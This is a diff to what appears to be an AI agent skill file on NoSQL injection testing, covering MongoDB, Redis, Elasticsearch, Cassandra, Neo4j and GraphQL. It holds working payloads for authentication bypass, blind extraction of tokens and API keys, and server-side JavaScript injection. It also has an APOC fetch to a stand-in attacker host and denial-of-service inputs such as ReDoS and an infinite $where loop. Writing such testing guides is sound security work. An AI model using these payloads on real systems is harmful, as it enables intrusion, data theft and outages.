@@ -1,44 +1,28 @@
 ---
 name: nosql-injection
-description: NoSQL injection testing covering MongoDB operator injection, authentication bypass, blind extraction, and Redis/DynamoDB/Elasticsearch-specific attack surfaces
+description: NoSQL injection testing covering MongoDB operator injection, authentication bypass, blind extraction, GraphQL variable injection, and Redis/DynamoDB/Elasticsearch/Neo4j-specific attack surfaces
 ---
 
 # NoSQL Injection
 
-NoSQL injection exploits the mismatch between how applications pass user input to database queries and how the database engine interprets that input. Unlike SQL injection, NoSQL injection frequently involves operator injection (e.g., MongoDB's `$gt`, `$regex`, `$where`) or structure injection (embedding JSON sub-documents). The attack surface is broad: MongoDB is the dominant target, but Redis, Elasticsearch, DynamoDB, Cassandra, and CouchDB each have distinct injection surfaces.
+NoSQL injection exploits the mismatch between how applications pass user input to database queries and how the database engine interprets that input. Unlike SQL injection, NoSQL injection frequently involves operator injection (e.g., MongoDB's `$gt`, `$regex`, `$where`) or structure injection (embedding JSON sub-documents). The attack surface is broad: MongoDB is the dominant target, but Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, and Neo4j each have distinct injection surfaces. GraphQL resolvers passing variables directly into a backing NoSQL filter are a frequent cross-cutting vector.
 
 ## Attack Surface
 
-**MongoDB**
-- Query filter objects (`find`, `findOne`, `aggregate` match stages)
-- JSON body parameters coerced into query objects
-- Authentication checks using `$ne`, `$regex`, `$where`, `$expr`
-- Aggregation pipelines with user-controlled `$match` / `$project` / `$lookup`
-- ODM/ORM wrappers (Mongoose, Morphia) using `where()` / raw filter objects
+**Input shapes that reach query filters**
+- JSON body parameters parsed straight into query objects
+- Form fields with bracket notation (`field[$ne]=`) coerced into operator objects by Express, PHP, and similar middleware
+- URL-encoded JSON in query strings, headers, and cookies
+- GraphQL variables passed directly into resolver-level NoSQL filters
 
-**Redis**
-- Command injection via raw command construction (KEYS, EVAL, CONFIG)
-- Lua script injection via EVAL
-- Pub/Sub channel name injection
-- Serialization-based injection (RESP protocol)
+**Code patterns that enable injection**
+- Raw filter dicts/objects from user input handed to `find`/`findOne`/`aggregate`
+- String concatenation into Cypher / CQL / Redis commands instead of the driver's parameterized form
+- ODM passthrough: Mongoose `{strict: false}`, Morphia raw `where()`, PyMongo `find()` with unsanitized JSON dicts (legacy `eval()` is fatal)
+- Server-side JavaScript surfaces: `$where`, `$function`, `$accumulator`, CouchDB `_design` views
 
-**Elasticsearch**
-- Lucene query injection via `query_string`, `simple_query_string`
-- JSON query DSL injection (embedded clauses, script injection)
-- Script injection via `_update` with Painless scripts
-
-**DynamoDB**
-- Filter expression injection (PartiQL, FilterExpression operators)
-- Attribute name/value collisions in expression maps
-
-**Cassandra**
-- CQL injection via string concatenation into `SELECT`/`INSERT`/`UPDATE` statements
-- `ALLOW FILTERING` queries with injected predicates
-- User-defined function (UDF) injection when user input flows into function bodies
-
-**CouchDB**
-- JavaScript `_design` document injection via Mango query selectors
-- MapReduce function injection if user controls design doc content
+**Stores in scope**
+MongoDB (primary), Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, Neo4j. Couchbase / DocumentDB / HBase / ScyllaDB / Memcached follow the same operator-injection or command-smuggling models — DocumentDB in particular accepts MongoDB payloads unchanged.
 
 ## High-Value Targets
 
@@ -109,21 +93,22 @@ Binary search the character space to minimize requests. Works on any string fiel
 
 If `$where` operator is enabled (disabled by default in MongoDB 7.0+; MongoDB 4.4–6.x deprecated it but left `javascriptEnabled` defaulting to `true`), inject arbitrary server-side JavaScript:
 ```json
-{"$where": "function(){return this.username == 'admin' && sleep(2000)}"}
-{"$where": "function(){return this.role == 'admin'}"}
+{"$where": "function(){return this.role == 'admin'}"}                          // direct filter — returns matching documents
+{"$where": "function(){return this.username == 'admin' && sleep(2000)}"}       // timing oracle only — sleep() returns undefined (falsy), so no documents are returned; observe latency
 ```
-`sleep()` is available in older MongoDB for timing-based blind extraction.
+`sleep()` is available in older MongoDB for blind extraction via response-time differential.
+
+### `$function` and `$accumulator` (MongoDB 4.4+)
+
+Server-side JavaScript in aggregations. `$function` must live inside an expression context — `$expr`, `$project`, `$addFields`, etc. — not as a top-level filter:
+```json
+{"$expr": {"$function": {"body": "function(doc){return doc.role == 'admin'}", "args": ["$$ROOT"], "lang": "js"}}}
+```
+Gated by the same `javascriptEnabled` parameter as `$where`, but reachable through aggregation endpoints — useful when `$where` is filtered at the query layer but aggregation pipelines remain user-influenceable.
 
 ### Aggregation Pipeline Injection
 
-User-controlled input flowing into `$match` or `$lookup` stages:
-```json
-// Input intended as a simple match value
-{"filter": {"role": "user"}}
-
-// Injected to widen scope:
-{"filter": {"role": {"$ne": "nonexistent"}, "$or": [{"role": "admin"}]}}
-```
+`$match`, `$lookup`, and `$project` stages accept the same operator payloads as `find()`. User-controlled `$lookup.from` is the highest-impact variant — it can pivot the query to a different collection (e.g., from `orders` into `users`) and exfiltrate cross-tenant data.
 
 ### Redis Command Injection
 
@@ -165,27 +150,56 @@ SELECT * FROM Users WHERE username = 'x' OR '1'='1
 
 ### Cassandra CQL Injection
 
-Cassandra Query Language (CQL) is syntactically similar to SQL. When user input is concatenated directly into CQL statements rather than using prepared statements (`session.prepare()`), injection is possible:
+CQL is SQL-shaped, so injection follows the SQL pattern when input is concatenated instead of bound via `session.prepare()`:
 
-```python
-# Vulnerable — string concatenation
-query = f"SELECT * FROM users WHERE username = '{username}'"
-
-# Injected: username = "' OR '1'='1
-SELECT * FROM users WHERE username = '' OR '1'='1'
-```
-
-**Authentication bypass:**
 ```
 username: ' OR '1'='1' ALLOW FILTERING --
+username: 'x' OR token(username) > token('a') ALLOW FILTERING --
 ```
 
-**Token extraction via UNION-style (Cassandra supports `IN` lists):**
-```
-username: 'x' OR token(username) > token('a') ALLOW FILTERING--
+No `SLEEP` or OOB primitive natively — detection is boolean/error-based only.
+
+### Neo4j Cypher Injection
+
+When user input is concatenated into Cypher rather than passed as a parameter (`$param`):
+```python
+# Vulnerable
+session.run(f"MATCH (u:User {{name: '{name}'}}) RETURN u")
+
+# Injected: name = x'}) RETURN u UNION MATCH (u:User) RETURN u //
 ```
 
-Cassandra does not support `SLEEP` or out-of-band primitives natively, so injection detection relies on boolean/error responses. Prepared statements (parameterized queries via the driver's `execute(prepared, [values])`) are the complete fix.
+**APOC abuse** (when `apoc.*` procedures are enabled via `dbms.security.procedures.unrestricted`):
+- `CALL apoc.load.json('http://attacker/x')` — SSRF and external data fetch
+- `CALL apoc.cypher.run("...", {})` — dynamic query execution from a string
+- `CALL dbms.security.listUsers()` — user enumeration on misconfigured Community Edition
+
+### GraphQL Variable Injection
+
+Resolvers passing variables straight into a backing NoSQL filter are a common chained vector:
+```graphql
+query Login($input: UserFilter!) {
+  user(filter: $input) { id role }
+}
+```
+With `$input` reaching `db.users.findOne(input)`, send:
+```json
+{"input": {"username": "admin", "password": {"$ne": ""}}}
+```
+Use introspection (`__schema`, `__type`) to enumerate which input types accept arbitrary objects — those are the operator-injection candidates.
+
+### Server-Side JavaScript Detection and DoS
+
+Fingerprint SSJS state before investing in `$where` / `$function` payloads:
+```javascript
+db.adminCommand({getParameter: 1, javascriptEnabled: 1})
+```
+
+DoS surface (use only with explicit authorization scope):
+- **ReDoS**: `{"field": {"$regex": "^(a+)+$"}}` against long values triggers catastrophic backtracking
+- **Large `$in` arrays**: thousands of values force linear scans on unindexed fields
+- **Infinite `$where` loops**: `{"$where": "while(true){}"}` if SSJS is enabled without query timeouts
+- **Heavy aggregations**: chained `$lookup` across large unindexed collections
 
 ## Bypass Techniques
 
@@ -199,10 +213,14 @@ Cassandra does not support `SLEEP` or out-of-band primitives natively, so inject
 
 **Operator Alternatives**
 - `$nin` (not in), `$exists: false`, `$type` — alternative operators that reach the same result when `$ne` is filtered
+- `$not` wrapping another operator: `{"field": {"$not": {"$eq": "value"}}}`
 - `$expr` with `$ne` for complex comparisons: `{"$expr": {"$ne": ["$password", "wrong"]}}`
 
-**Whitespace/Encoding in `$regex`**
-- Use case-insensitive flag: `{"$regex": "^admin$", "$options": "i"}`
+**Structure Manipulation**
+- Dotted-key vs nested object: `{"a.b": "c"}` vs `{"a": {"b": "c"}}` — sanitizers often strip one form but pass the other
+- Array vs object operator wrapping: some parsers treat `["$or", ...]` as operator arrays
+- Prototype pollution: `__proto__` and `constructor.prototype` keys in JSON bodies polluting Object prototypes consumed downstream by query builders
+- `$regex` case-insensitive flag (`"$options": "i"`) widens matches that case-sensitive filters miss
 
 ## Testing Methodology
 
@@ -214,7 +232,8 @@ Cassandra does not support `SLEEP` or out-of-band primitives natively, so inject
 6. **Extract data blindly** — character-by-character `$regex` on sensitive fields (token, reset code)
 7. **Test `$where`** — if older MongoDB version detected, attempt JavaScript sleep-based timing
 8. **Probe aggregation endpoints** — inject operators into `filter`/`match`/`sort` fields
-9. **Test non-MongoDB stores** — Elasticsearch `query_string`, Redis command construction, DynamoDB PartiQL
+9. **Test non-MongoDB stores** — Elasticsearch `query_string`, Redis command construction, DynamoDB PartiQL, Neo4j Cypher concatenation, Cassandra CQL
+10. **Test GraphQL resolvers** — submit operator objects via variables on any input type that reaches a NoSQL filter; use `__schema` introspection to enumerate candidates
 
 ## Validation
 
@@ -244,11 +263,10 @@ Cassandra does not support `SLEEP` or out-of-band primitives natively, so inject
 1. Always try both JSON body (`{"field": {"$ne": null}}`) and bracket-notation form (`field[$ne]=`) — different middleware handles them differently
 2. Target reset token and API key fields with `$regex` extraction, not just passwords
 3. Check MongoDB version via error messages or `/admin/serverStatus`; `$where` is active by default on pre-7.0 instances — that includes 4.4–6.x targets where `javascriptEnabled` was deprecated but not yet disabled, making them still exploitable unless explicitly hardened
-4. In Mongoose, `{strict: false}` passes arbitrary operators to MongoDB — grep the codebase if you have access
-5. For Elasticsearch, try `_cat/indices`, `_mapping`, and `_search` with `query_string: *` before attempting script injection
-6. Redis injection requires newline characters (`\r\n`) in the injected value — verify URL encoding handling in the chain
-7. Combine authentication bypass with a second request to `/admin` or `/api/users` to escalate impact
-8. Automate `$regex` extraction with binary search: 7 requests per character vs 94 with linear search
+4. For Elasticsearch, try `_cat/indices`, `_mapping`, and `_search` with `query_string: *` before attempting script injection
+5. Combine authentication bypass with a second request to `/admin` or `/api/users` to escalate impact
+6. Automate `$regex` extraction with binary search: 7 requests per character vs 94 with linear search
+7. GraphQL resolvers are an underexplored entry point — try operator objects in any input type that reaches a NoSQL filter, and use introspection to find candidate fields
 
 ## Summary
 
